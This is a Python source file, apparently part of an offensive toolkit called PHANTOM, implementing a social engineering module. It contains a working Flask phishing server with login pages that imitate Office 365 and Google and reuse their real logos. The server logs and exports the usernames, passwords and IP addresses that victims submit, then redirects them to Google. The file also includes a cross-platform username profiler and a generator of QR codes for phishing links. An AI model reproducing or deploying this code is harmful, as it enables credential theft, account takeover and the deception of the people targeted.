#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM Social Engineering Module

Social engineering attack frameworks including
phishing, credential harvesting, and social profiling.
"""

import os
import subprocess
import json
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False


@dataclass
class PhishingTemplate:
    """Phishing template container"""
    name: str
    category: str
    html: str
    css: str = ""
    js: str = ""
    redirect_url: str = ""


@dataclass
class CapturedCredential:
    """Captured credential container"""
    timestamp: str
    source_ip: str
    user_agent: str
    username: str
    password: str
    additional: Dict[str, str] = field(default_factory=dict)


class PhishingServer:
    """Simple phishing page server"""
    
    TEMPLATES = {
        'generic_login': '''
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign In</h2>
        <form method="POST" action="/capture">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
        ''',
        'office365': '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; width: 440px; padding: 44px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; }
        input { width: 100%; padding: 8px 0; margin: 8px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; }
        button { width: 100%; padding: 11px; background: #0067b8; color: white; border: none; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.png" width="108" alt="Microsoft">
        <h1>Sign in</h1>
        <form method="POST" action="/capture">
            <input type="email" name="username" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
        ''',
        'google': '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: white; }
        .container { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 350px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; }
        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" width="75" style="display: block; margin: 0 auto;">
        <h1>Sign in</h1>
        <p style="text-align: center; color: #202124;">Use your Google Account</p>
        <form method="POST" action="/capture">
            <input type="email" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
        '''
    }
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.credentials: List[CapturedCredential] = []
        self.app = Flask(__name__) if FLASK_AVAILABLE else None
        self.current_template = "generic_login"
    
    def set_template(self, template_name: str):
        """Set the phishing template"""
        if template_name in self.TEMPLATES:
            self.current_template = template_name
    
    def start_server(self, template: str = None):
        """Start the phishing server"""
        if not FLASK_AVAILABLE:
            print("[-] Flask not installed. Install with: pip install flask")
            return
        
        if template:
            self.set_template(template)
        
        @self.app.route('/')
        def index():
            return render_template_string(self.TEMPLATES[self.current_template])
        
        @self.app.route('/capture', methods=['POST'])
        def capture():
            cred = CapturedCredential(
                timestamp=datetime.now().isoformat(),
                source_ip=request.remote_addr,
                user_agent=request.user_agent.string,
                username=request.form.get('username', ''),
                password=request.form.get('password', ''),
                additional={k: v for k, v in request.form.items() if k not in ['username', 'password']}
            )
            self.credentials.append(cred)
            print(f"[+] Captured: {cred.username}:{cred.password} from {cred.source_ip}")
            
            # Redirect to legitimate site
            return '<script>window.location.href="https://www.google.com";</script>'
        
        print(f"[*] Starting phishing server on port {self.port}")
        print(f"[*] Template: {self.current_template}")
        self.app.run(host='0.0.0.0', port=self.port, debug=False)
    
    def get_credentials(self) -> List[Dict[str, Any]]:
        """Get captured credentials"""
        return [vars(c) for c in self.credentials]
    
    def export_credentials(self, filepath: str):
        """Export credentials to file"""
        with open(filepath, 'w') as f:
            json.dump(self.get_credentials(), f, indent=2)


class SocialProfiler:
    """Social media intelligence gathering"""
    
    PLATFORMS = [
        'twitter.com', 'instagram.com', 'facebook.com', 'linkedin.com',
        'github.com', 'reddit.com', 'tiktok.com', 'youtube.com',
        'pinterest.com', 'tumblr.com', 'medium.com', 'snapchat.com'
    ]
    
    def __init__(self):
        self.results: Dict[str, Any] = {}
    
    def check_username(self, username: str) -> Dict[str, Any]:
        """Check username across platforms"""
        import requests
        
        results = {
            'username': username,
            'found': [],
            'not_found': [],
            'errors': []
        }
        
        for platform in self.PLATFORMS:
            url = f"https://{platform}/{username}"
            try:
                response = requests.get(url, timeout=5, allow_redirects=True)
                if response.status_code == 200:
                    results['found'].append({
                        'platform': platform,
                        'url': url
                    })
                else:
                    results['not_found'].append(platform)
            except Exception as e:
                results['errors'].append({
                    'platform': platform,
                    'error': str(e)
                })
        
        return results
    
    def search_email(self, email: str) -> Dict[str, Any]:
        """Search for email in breach databases"""
        # This would typically use an API like HaveIBeenPwned
        return {
            'email': email,
            'note': 'Breach check requires API access'
        }


class QRCodeGenerator:
    """Generate malicious QR codes"""
    
    def generate(self, data: str, output_path: str = None) -> str:
        """Generate QR code"""
        try:
            import qrcode
            
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(data)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            
            output_path = output_path or f"/tmp/qr_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            img.save(output_path)
            
            return output_path
            
        except ImportError:
            print("[-] qrcode library not installed. Install with: pip install qrcode[pil]")
            return ""
    
    def generate_phishing_qr(self, url: str, output_path: str = None) -> str:
        """Generate QR code for phishing URL"""
        return self.generate(url, output_path)


class SocialEngineering:
    """
    Master Social Engineering Module
    
    Provides:
    - Phishing page hosting
    - Credential harvesting
    - Social media profiling
    - QR code generation
    """
    
    def __init__(self):
        self.phishing_server = PhishingServer()
        self.social_profiler = SocialProfiler()
        self.qr_generator = QRCodeGenerator()
    
    def start_phishing(self, template: str = "generic_login", port: int = 8080):
        """Start phishing server"""
        self.phishing_server.port = port
        self.phishing_server.start_server(template)
    
    def get_captured_credentials(self) -> List[Dict[str, Any]]:
        """Get captured credentials"""
        return self.phishing_server.get_credentials()
    
    def profile_username(self, username: str) -> Dict[str, Any]:
        """Profile a username across social platforms"""
        return self.social_profiler.check_username(username)
    
    def generate_qr(self, data: str, output: str = None) -> str:
        """Generate QR code"""
        return self.qr_generator.generate(data, output)
    
    def list_templates(self) -> List[str]:
        """List available phishing templates"""
        return list(self.phishing_server.TEMPLATES.keys())
